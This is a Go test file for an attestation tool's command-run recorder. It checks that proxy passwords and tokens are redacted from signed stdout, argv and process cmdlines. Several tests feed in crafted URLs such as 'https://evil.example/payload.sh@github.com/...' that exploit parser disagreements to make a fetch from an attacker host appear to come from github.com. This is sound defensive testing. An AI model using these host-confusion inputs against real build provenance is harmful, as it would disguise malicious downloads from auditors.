// jade:ring local
//
// Copyright 2026 TestifySec, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package commandrun

import (
	"net/url"
	"runtime"
	"strings"
	"testing"

	"github.com/aflock-ai/rookery/attestation"
	"github.com/aflock-ai/rookery/attestation/redact"
)

// TestAttestRedactsURLCredentialsFromOutputAndArgv is the leak the second
// e1 review found. The env-value scrub keys on the NAME of an environment
// variable, and a credentialed proxy URL lives under HTTP_PROXY, which is not
// a secret-looking name. So a command that prints its environment, or takes
// the proxy on its command line, signed the password verbatim into stdout,
// stderr and the top-level cmd. The credential is in the VALUE: this is the
// same rule the environment attestor applies, run over the recorded text.
//
// None of these secrets is in the environment of the test process, so the
// name-based scrub cannot be what removes them.
func TestAttestRedactsURLCredentialsFromOutputAndArgv(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell")
	}
	const (
		stdoutSecret = "p1secret-proxy"
		stderrSecret = "p2secret-proxy"
		argvSecret   = "p3secret-argv"
	)
	script := `echo "HTTP_PROXY=http://u:` + stdoutSecret + `@proxy:3128"; ` +
		`echo "curl -x u:` + stderrSecret + `@proxy:3128 https://example.com" 1>&2`
	actx, err := attestation.NewContext("url-credentials", []attestation.Attestor{}, attestation.WithWorkingDir(t.TempDir()))
	if err != nil {
		t.Fatalf("NewContext: %v", err)
	}
	rc := New(
		WithCommand([]string{"sh", "-c", script, "curl", "-x", "http://u:" + argvSecret + "@proxy:3128", "--proxy=u:" + argvSecret + "@proxy:3128"}),
		WithSilent(true),
	)
	if err := rc.Attest(actx); err != nil {
		t.Fatalf("Attest: %v", err)
	}

	for _, secret := range []string{stdoutSecret, stderrSecret, argvSecret} {
		if strings.Contains(rc.Stdout, secret) || strings.Contains(rc.Stderr, secret) {
			t.Errorf("recorded output still holds %q:\nstdout=%q\nstderr=%q", secret, rc.Stdout, rc.Stderr)
		}
		for i, a := range rc.Cmd {
			if strings.Contains(a, secret) {
				t.Errorf("recorded cmd[%d] still holds %q: %q", i, secret, a)
			}
		}
	}
	// Only the userinfo goes: the key, scheme, host and port stay, and so
	// does every byte around them. A "--proxy=" before a scheme-less value
	// is not taken on trust: read whole, "--proxy=u" is the user, so it goes
	// with the userinfo.
	if want := "HTTP_PROXY=http://******@proxy:3128\n"; rc.Stdout != want {
		t.Errorf("Stdout = %q, want %q", rc.Stdout, want)
	}
	if want := "curl -x ******@proxy:3128 https://example.com\n"; rc.Stderr != want {
		t.Errorf("Stderr = %q, want %q", rc.Stderr, want)
	}
	wantScript := `echo "HTTP_PROXY=http://******@proxy:3128"; ` +
		`echo "curl -x ******@proxy:3128 https://example.com" 1>&2`
	wantCmd := []string{"sh", "-c", wantScript, "curl", "-x", "http://******@proxy:3128", "******@proxy:3128"}
	if strings.Join(rc.Cmd, "\x00") != strings.Join(wantCmd, "\x00") {
		t.Errorf("Cmd = %q\nwant  %q", rc.Cmd, wantCmd)
	}

	// The signed bytes, not just the struct.
	body, _, err := MarshalV02WithSections(rc.ToV02())
	if err != nil {
		t.Fatalf("MarshalV02WithSections: %v", err)
	}
	for _, secret := range []string{stdoutSecret, stderrSecret, argvSecret} {
		if strings.Contains(string(body), secret) {
			t.Errorf("%q leaked into the signed v0.2 predicate body", secret)
		}
	}
}

// TestAttestNeverRecordsAHostTheCommandDidNotUse is the blocking finding of
// the e1 re-review and of the scrub review after it. The pusher chooses the
// command, and the scrub used to read
// "https://evil.example/payload.sh@github.com/actions/runner" to its last
// at-sign and sign "https://******@github.com/actions/runner": a fetch from
// github.com with its credentials redacted. Go, WHATWG and curl connect to
// evil.example. The scheme-less spelling "evil.example:8080/payload.sh@..."
// was still signed that way after the first fix: Go's ProxyFromEnvironment
// and curl -x read proxy evil.example:8080, and only Python's proxy parser
// reads github.com.
//
// Where the parsers do not agree on one userinfo and one host, the signed
// text names no host at all: only the scheme, if any, and "******@" are left,
// and every reading of the signed cmd, stdout and stderr names evil.example
// or nothing.
func TestAttestNeverRecordsAHostTheCommandDidNotUse(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell")
	}
	const (
		pathAt       = "https://evil.example/payload.sh@github.com/actions/runner"
		twoAt        = "https://a@evil.example@github.com/x"
		schemelessAt = "evil.example:8080/payload.sh@github.com/actions/runner"
	)
	script := `echo "fetching ` + pathAt + `"; echo "fetching ` + twoAt + `" 1>&2; echo "proxy ` + schemelessAt + `"; true`
	actx, err := attestation.NewContext("url-host", []attestation.Attestor{}, attestation.WithWorkingDir(t.TempDir()))
	if err != nil {
		t.Fatalf("NewContext: %v", err)
	}
	rc := New(WithCommand([]string{"sh", "-c", script, "curl", pathAt, twoAt, "-x", schemelessAt}), WithSilent(true))
	if err := rc.Attest(actx); err != nil {
		t.Fatalf("Attest: %v", err)
	}

	if want := "fetching https://******@/\nproxy ******@/\n"; rc.Stdout != want {
		t.Errorf("Stdout = %q, want %q", rc.Stdout, want)
	}
	if want := "fetching https://******@/\n"; rc.Stderr != want {
		t.Errorf("Stderr = %q, want %q", rc.Stderr, want)
	}
	wantScript := `echo "fetching https://******@/"; echo "fetching https://******@/" 1>&2; echo "proxy ******@/"; true`
	wantCmd := []string{"sh", "-c", wantScript, "curl", "https://******@", "https://******@", "-x", "******@"}
	if strings.Join(rc.Cmd, "\x00") != strings.Join(wantCmd, "\x00") {
		t.Errorf("Cmd = %q\nwant  %q", rc.Cmd, wantCmd)
	}

	body, _, err := MarshalV02WithSections(rc.ToV02())
	if err != nil {
		t.Fatalf("MarshalV02WithSections: %v", err)
	}
	if strings.Contains(string(body), "github.com") {
		t.Errorf("the signed v0.2 body names github.com, a host the command did not use: %s", body)
	}
	// Each signed URL, read by Go as a URL or, with no scheme, as a proxy
	// value, names evil.example or no host.
	for _, signed := range append([]string{rc.Stdout, rc.Stderr}, rc.Cmd...) {
		for _, field := range strings.FieldsFunc(signed, func(r rune) bool { return r <= ' ' || r == '"' || r == ';' }) {
			if !strings.Contains(field, "@") {
				continue
			}
			in := field
			if !strings.Contains(field, "://") {
				in = "http://" + field
			}
			if u, err := url.Parse(in); err == nil && u.Host != "" && u.Hostname() != "evil.example" {
				t.Errorf("signed %q reads as host %q", field, u.Host)
			}
		}
	}
}

// An argv element is one value, so a URL in it is read whole, as its
// consumer reads it. Node's WHATWG parser accepts a space in a userinfo, so
// "http://u:my p3secret@proxy:3128" is a credential there; read as text it
// is two words, and neither is a URL.
func TestRedactArgvReadsEachElementWhole(t *testing.T) {
	argv := []string{"node", "fetch.js", "--proxy", "http://u:my p3secret-argv@proxy:3128", "see http://u:p@h and a@b.example"}
	redactArgv(argv)
	want := []string{"node", "fetch.js", "--proxy", "http://******@proxy:3128", "see http://******@h and a@b.example"}
	if strings.Join(argv, "\x00") != strings.Join(want, "\x00") {
		t.Errorf("argv = %q\nwant   %q", argv, want)
	}
}

// The same argv reaches the signed Cmdlines[] table a second time, as the
// traced process's /proc/<pid>/cmdline, and there its elements are separated
// by NULs. Joined with spaces before the scrub reads it, "http://u:my
// p6secret-cmdline@proxy:3128" is two words, neither of them a URL, so the
// password redactArgv takes out of cmd was signed again in Cmdlines[] on
// every traced run. Each element is read whole before the join.
func TestProcCmdlineReadsEachArgvElementWhole(t *testing.T) {
	const secret = "p6secret-cmdline"
	raw := "node\x00fetch.js\x00--proxy\x00http://u:my " + secret + "@proxy:3128\x00" +
		"--url=http://u:my " + secret + "@proxy:3128\x00" +
		"https://a@evil.example@github.com/x\x00next\x00"
	want := "node fetch.js --proxy http://******@proxy:3128 --url=http://******@proxy:3128 https://******@/ next"

	got := procCmdline(raw)
	if got != want {
		t.Errorf("procCmdline = %q\nwant          %q", got, want)
	}
	// The end-of-run scrub reads the joined line as text and must leave
	// what the element pass wrote as it is.
	procs := []ProcessInfo{{ProcessID: 102, Cmdline: got}}
	redactProcessCmdlines(procs)
	if procs[0].Cmdline != want {
		t.Errorf("after redactProcessCmdlines = %q\nwant                         %q", procs[0].Cmdline, want)
	}
	if strings.Contains(procs[0].Cmdline, secret) || strings.Contains(procs[0].Cmdline, "github.com") {
		t.Errorf("signed Cmdline holds the password or a host the command did not use: %q", procs[0].Cmdline)
	}
}

// The name-based scrub finds a sensitive variable's value byte for byte, so it
// has to read a cmdline before the URL scrub rewrites any of it. procCmdline
// took the userinfo out of each element at capture time, and by the end-of-run
// pass the value of API_TOKEN="https://u:pw@host/?token=..." was no longer in
// the line: the query token, which is not userinfo, was signed in Cmdlines[].
// The same holds for a value the shell split into two elements, which the
// joined line holds whole with a space where the NUL was.
func TestProcCmdlineScrubsSensitiveEnvValuesBeforeURLs(t *testing.T) {
	const (
		querySecret = "p7secret-query-token"
		splitSecret = "p8secret-split-tail"
	)
	t.Setenv("API_TOKEN", "https://u:p7pw@host/?token="+querySecret)
	t.Setenv("DEPLOY_TOKEN", "https://u:p8pw@host "+splitSecret)
	raw := "curl\x00https://u:p7pw@host/?token=" + querySecret + "\x00--data\x00x\x00" +
		"deploy\x00https://u:p8pw@host\x00" + splitSecret + "\x00"
	want := "curl [REDACTED] --data x deploy [REDACTED]"

	procs := []ProcessInfo{{ProcessID: 104, Cmdline: procCmdline(raw)}}
	redactProcessCmdlines(procs)
	for _, secret := range []string{querySecret, splitSecret, "p7pw", "p8pw"} {
		if strings.Contains(procs[0].Cmdline, secret) {
			t.Errorf("signed Cmdline holds %q: %q", secret, procs[0].Cmdline)
		}
	}
	if procs[0].Cmdline != want {
		t.Errorf("Cmdline = %q\nwant      %q", procs[0].Cmdline, want)
	}
}

// A cmdline with no credential in it is signed as it always was: the
// elements joined by one space, with the ends trimmed.
func TestProcCmdlineKeepsOrdinaryArgvByteForByte(t *testing.T) {
	for _, raw := range []string{
		"go\x00build\x00./...\x00",
		"git\x00clone\x00git@github.com:org/repo.git\x00",
		"sh\x00-c\x00echo a@b; curl https://example.com/x\x00",
		"docker\x00pull\x00docker.io/library/node@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\x00",
		"a b\x00 c\x00",
		"\x00",
		"",
	} {
		want := strings.TrimSpace(strings.ReplaceAll(raw, "\x00", " "))
		if got := procCmdline(raw); got != want {
			t.Errorf("procCmdline(%q) = %q, want %q", raw, got, want)
		}
	}
}

// The element pass and the end-of-run text pass agree: the text pass leaves
// a procCmdline line as it is, and a cmdline with no at-sign is only joined
// and has the values of sensitive variables masked, as the line with its NULs
// turned into spaces would.
func FuzzProcCmdline(f *testing.F) {
	for _, s := range []string{
		"node\x00--proxy\x00http://u:my pw@proxy:3128\x00",
		"curl\x00https://a@evil.example@github.com/x\x00next\x00",
		"sh\x00-c\x00echo http://u:p@h a@b\x00",
		"a\x00u:p@h:1\x00\x00",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, raw string) {
		got := procCmdline(raw)
		if !strings.Contains(raw, "@") {
			if want := strings.TrimSpace(redactSensitiveEnvValues(strings.ReplaceAll(raw, "\x00", " "))); got != want {
				t.Fatalf("changed a cmdline with no at-sign: %q -> %q", raw, got)
			}
		}
		if again := redact.URLCredentialsInText(got); again != got {
			t.Fatalf("the text pass changes a procCmdline line: %q -> %q -> %q", raw, got, again)
		}
	})
}

// TestRedactProcessCmdlinesRedactsURLCredentials covers the traced-process
// sink: a descendant "curl -x http://u:pw@proxy" is read from /proc and
// signed in Cmdlines[]. Its secret is not in the environment either.
func TestRedactProcessCmdlinesRedactsURLCredentials(t *testing.T) {
	procs := []ProcessInfo{
		{ProcessID: 100, Cmdline: "curl -x http://u:p4secret-cmdline@proxy:3128 https://example.com"},
		{ProcessID: 101, Cmdline: "git clone https://x-access-token:p5secret-cmdline@github.com/o/r.git"},
	}
	redactProcessCmdlines(procs)
	want := []string{
		"curl -x http://******@proxy:3128 https://example.com",
		"git clone https://******@github.com/o/r.git",
	}
	for i, p := range procs {
		if p.Cmdline != want[i] {
			t.Errorf("pid %d Cmdline = %q, want %q", p.ProcessID, p.Cmdline, want[i])
		}
	}
}

// TestURLCredentialScrubLeavesOrdinaryOutputByteForByte: stdout is stored
// byte for byte on purpose, so the scrub may touch a URL userinfo and nothing
// else. Each of these holds an at-sign, a colon or a URL and must come back
// unchanged.
//
// The first case is the one a whole-value reading gets wrong. The environment
// attestor reads a value that IS a URL to its last at-sign, because a proxy
// variable holds exactly one URL. Output is text: a log that starts with a
// URL and mentions an email address three lines later is not one URL, and
// reading it as one would sign "https://******@example.com>".
func TestURLCredentialScrubLeavesOrdinaryOutputByteForByte(t *testing.T) {
	for _, s := range []string{
		"https://jira.example/browse/ABC-1 fix\n\nSigned-off-by: Alice <alice@example.com>\n",
		"https://registry.npmjs.org/ ok\nalice@example.com\n",
		"git@github.com:org/repo.git\n",
		"go: downloading github.com/foo/bar@v1.2.3\n",
		"pkg:npm/lodash@4.17.21 pkg:golang/github.com/foo/bar@v1.2.3\n",
		"docker.io/library/node@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n",
		"--- FAIL: TestX (0.00s)\n    x_test.go:12: got a@b\n",
		"mailto:alice@example.com\tactions/checkout@v4 @scope/pkg@1.2.3\r\n",
		"PATH=/usr/bin:/opt/homebrew/opt/python@3.11/bin\n",
		"time=12:00:01 level=info msg=\"GET https://example.com/x 200\"\n",
		`{"level":"info","url":"https://api.example.com/v1","author":"alice@example.com","status":"PASS"}` + "\n",
		"",
	} {
		if got := redactOutput(s); got != s {
			t.Errorf("redactOutput changed ordinary output\n in: %q\nout: %q", s, got)
		}
	}
}

// The price of never naming a false host: an at-sign past a plain host is a
// path for Go, WHATWG and curl, and ends a userinfo for Python's proxy
// parser, and shape cannot tell a path from a password that holds '/'. So
// such a URL keeps its scheme and "******@", and loses the rest.
func TestURLCredentialScrubDropsAURLWithAnAtSignInItsPath(t *testing.T) {
	for in, want := range map[string]string{
		"pip install git+https://github.com/org/repo@v1.2.3\n":                     "pip install git+https://******@/\n",
		"https://medium.com/@user/post https://www.npmjs.com/package/@scope/pkg\n": "https://******@/ https://******@/\n",
	} {
		if got := redactOutput(in); got != want {
			t.Errorf("redactOutput(%q) = %q, want %q", in, got, want)
		}
	}
}

// A scheme-less proxy value in argv is one value, as an environment value is:
// "env HTTP_PROXY=u:my secret@proxy:3128 python x.py" hands Python's urllib a
// password holding a space, which it sends (_parse_proxy runs the userinfo to
// the last at-sign and checks no byte of it). Read as text the element is two
// words, "HTTP_PROXY=u:my" and "secret@proxy:3128", and the first holds no
// at-sign. A token alone in the username slot ("tok@proxy:3128") is sent by
// Go and curl with an empty password. The top-level cmd, the traced
// Cmdlines[] and the signed body all lose both.
func TestAttestRedactsSchemelessArgvWithWhitespace(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell")
	}
	const (
		spaceSecret = "p9secret space"
		tabSecret   = "p9secret\ttab"
		userToken   = "ghp_p9usertoken"
	)
	argv := []string{
		"sh", "-c", "true", "env",
		"HTTP_PROXY=u:" + spaceSecret + "@proxy:3128",
		"--proxy=u:" + tabSecret + "@proxy:3128",
		"my user:" + spaceSecret + "@proxy:3128",
		userToken + "@proxy:3128",
		"alice@example.com",
	}
	actx, err := attestation.NewContext("url-credentials-whitespace", []attestation.Attestor{}, attestation.WithWorkingDir(t.TempDir()))
	if err != nil {
		t.Fatalf("NewContext: %v", err)
	}
	rc := New(WithCommand(argv), WithSilent(true))
	if err := rc.Attest(actx); err != nil {
		t.Fatalf("Attest: %v", err)
	}
	wantCmd := []string{
		"sh", "-c", "true", "env",
		"******@proxy:3128",
		"******@proxy:3128",
		"******@proxy:3128",
		"******@proxy:3128",
		"alice@example.com",
	}
	if strings.Join(rc.Cmd, "\x00") != strings.Join(wantCmd, "\x00") {
		t.Errorf("Cmd = %q\nwant  %q", rc.Cmd, wantCmd)
	}

	raw := strings.Join(argv, "\x00") + "\x00"
	procs := []ProcessInfo{{ProcessID: 105, Cmdline: procCmdline(raw)}}
	redactProcessCmdlines(procs)
	if want := strings.Join(wantCmd, " "); procs[0].Cmdline != want {
		t.Errorf("Cmdline = %q\nwant      %q", procs[0].Cmdline, want)
	}

	body, _, err := MarshalV02WithSections(rc.ToV02())
	if err != nil {
		t.Fatalf("MarshalV02WithSections: %v", err)
	}
	for _, secret := range []string{"p9secret", userToken, "my user"} {
		if strings.Contains(string(body), secret) || strings.Contains(procs[0].Cmdline, secret) {
			t.Errorf("%q leaked into the signed cmd or Cmdlines[]:\nbody=%s\ncmdline=%q", secret, body, procs[0].Cmdline)
		}
	}
}

// Two readings the word-by-word scrub missed, through Attest: cmd, stdout and
// the traced Cmdlines[].
//
//   - WHATWG removes every tab, LF and CR from its input before it parses, so
//     the argv element "http:/<TAB>/u:secret@proxy:3128" is
//     http://u:secret@proxy:3128 to Node. Read as text it split at the tab,
//     and "/u:secret@proxy:3128" read as a path.
//   - Python's proxy parser ends the authority at the first '/' after the
//     first at-sign, not at '?' or '#', so
//     "http://u:first@proxy-a?tail@proxy-b:3128" sends password
//     "first@proxy-a?tail" to proxy-b:3128, and only "first" was redacted.
func TestAttestRedactsWHATWGAndPythonUserinfoReadingsInArgvAndOutput(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell")
	}
	const (
		tabSecret   = "p10secret-tab"
		queryTail   = "p10secret-query-tail"
		fragTail    = "p10secret-fragment-tail"
		stdoutTail  = "p10secret-stdout-tail"
		newlineSecr = "p10secret-newline"
	)
	argv := []string{
		"sh", "-c", `echo "HTTP_PROXY=http://u:first@proxy-a?` + stdoutTail + `@proxy-b:3128"`,
		"node", "fetch.js",
		"http:/\t/u:" + tabSecret + "@proxy:3128",
		"--proxy=http:/\n/u:" + newlineSecr + "@proxy:3128",
		"http://u:first@proxy-a?" + queryTail + "@proxy-b:3128",
		"--proxy=http://u:first@proxy-a#" + fragTail + "@proxy-b:3128",
		"http://u:first@proxy-a/tail@proxy-b:3128",
	}
	actx, err := attestation.NewContext("url-credentials-readings", []attestation.Attestor{}, attestation.WithWorkingDir(t.TempDir()))
	if err != nil {
		t.Fatalf("NewContext: %v", err)
	}
	rc := New(WithCommand(argv), WithSilent(true))
	if err := rc.Attest(actx); err != nil {
		t.Fatalf("Attest: %v", err)
	}
	wantCmd := []string{
		"sh", "-c", `echo "HTTP_PROXY=http://******@/"`,
		"node", "fetch.js",
		"******@",
		"--proxy=******@",
		"http://******@",
		"--proxy=http://******@",
		"http://******@proxy-a/tail@proxy-b:3128",
	}
	if strings.Join(rc.Cmd, "\x00") != strings.Join(wantCmd, "\x00") {
		t.Errorf("Cmd = %q\nwant  %q", rc.Cmd, wantCmd)
	}
	if want := "HTTP_PROXY=http://******@/\n"; rc.Stdout != want {
		t.Errorf("Stdout = %q, want %q", rc.Stdout, want)
	}

	raw := strings.Join(argv, "\x00") + "\x00"
	procs := []ProcessInfo{{ProcessID: 110, Cmdline: procCmdline(raw)}}
	redactProcessCmdlines(procs)

	body, _, err := MarshalV02WithSections(rc.ToV02())
	if err != nil {
		t.Fatalf("MarshalV02WithSections: %v", err)
	}
	for _, secret := range []string{tabSecret, queryTail, fragTail, stdoutTail, newlineSecr, "first"} {
		if strings.Contains(string(body), secret) || strings.Contains(procs[0].Cmdline, secret) {
			t.Errorf("%q leaked into the signed cmd, stdout or Cmdlines[]:\nbody=%s\ncmdline=%q", secret, body, procs[0].Cmdline)
		}
	}
	if !strings.Contains(procs[0].Cmdline, "http://******@proxy-a/tail@proxy-b:3128") {
		t.Errorf("Cmdline lost a URL every parser reads the same way: %q", procs[0].Cmdline)
	}
}

// Two readings a redaction missed, through Attest: cmd, stdout and the
// traced Cmdlines[].
//
//   - An empty userinfo ended the search for one. Python's proxy parser runs
//     from the first at-sign to the first '/' after it, so
//     "http://@proxy-a?u:secret@proxy-b:3128" sends password "secret" to
//     proxy-b, although Go, curl and WHATWG read an empty user at proxy-a.
//   - A word that opens with "TOKEN=" was read as an assignment only. '=' is
//     base64 padding, so the positional proxy value "dG9rZW4=@proxy:3128"
//     read as key "dG9rZW4" and an empty userinfo, and curl -x sends the
//     token as the user.
func TestAttestRedactsEmptyUserinfoAndPaddedTokenReadings(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell")
	}
	const (
		afterEmpty  = "p11secret-after-empty"
		password    = "p11secret-password"
		padded1     = "cDExYQ"  // base64 "p11a" is "cDExYQ=="
		padded2     = "cDExYmI" // base64 "p11bb" is "cDExYmI="
		stdoutToken = "cDExY2M" // base64 "p11cc" is "cDExY2M="
	)
	argv := []string{
		"sh", "-c", `echo "curl -x ` + stdoutToken + `=@proxy:3128 http://@proxy-a#u:` + afterEmpty + `-out@proxy-b:3128"`,
		"curl",
		"-x", padded1 + "==@proxy:3128",
		"-x", padded2 + "=:" + password + "@proxy:3128",
		"http://@proxy-a?u:" + afterEmpty + "@proxy-b:3128",
		"--proxy=http://@proxy-a#u:" + afterEmpty + "@proxy-b:3128",
		"http://@proxy-a/tail@proxy-b:3128",
	}
	actx, err := attestation.NewContext("url-credentials-empty-and-padded", []attestation.Attestor{}, attestation.WithWorkingDir(t.TempDir()))
	if err != nil {
		t.Fatalf("NewContext: %v", err)
	}
	rc := New(WithCommand(argv), WithSilent(true))
	if err := rc.Attest(actx); err != nil {
		t.Fatalf("Attest: %v", err)
	}
	wantCmd := []string{
		"sh", "-c", `echo "curl -x ******@proxy:3128 http://******@/"`,
		"curl",
		"-x", "******@proxy:3128",
		"-x", "******@proxy:3128",
		"http://******@",
		"--proxy=http://******@",
		"http://@proxy-a/tail@proxy-b:3128",
	}
	if strings.Join(rc.Cmd, "\x00") != strings.Join(wantCmd, "\x00") {
		t.Errorf("Cmd = %q\nwant  %q", rc.Cmd, wantCmd)
	}
	if want := "curl -x ******@proxy:3128 http://******@/\n"; rc.Stdout != want {
		t.Errorf("Stdout = %q, want %q", rc.Stdout, want)
	}

	raw := strings.Join(argv, "\x00") + "\x00"
	procs := []ProcessInfo{{ProcessID: 111, Cmdline: procCmdline(raw)}}
	redactProcessCmdlines(procs)

	body, _, err := MarshalV02WithSections(rc.ToV02())
	if err != nil {
		t.Fatalf("MarshalV02WithSections: %v", err)
	}
	for _, secret := range []string{afterEmpty, password, padded1, padded2, stdoutToken} {
		if strings.Contains(string(body), secret) || strings.Contains(procs[0].Cmdline, secret) {
			t.Errorf("%q leaked into the signed cmd, stdout or Cmdlines[]:\nbody=%s\ncmdline=%q", secret, body, procs[0].Cmdline)
		}
	}
	if !strings.Contains(procs[0].Cmdline, "http://@proxy-a/tail@proxy-b:3128") {
		t.Errorf("Cmdline lost a URL every parser reads the same way: %q", procs[0].Cmdline)
	}
}
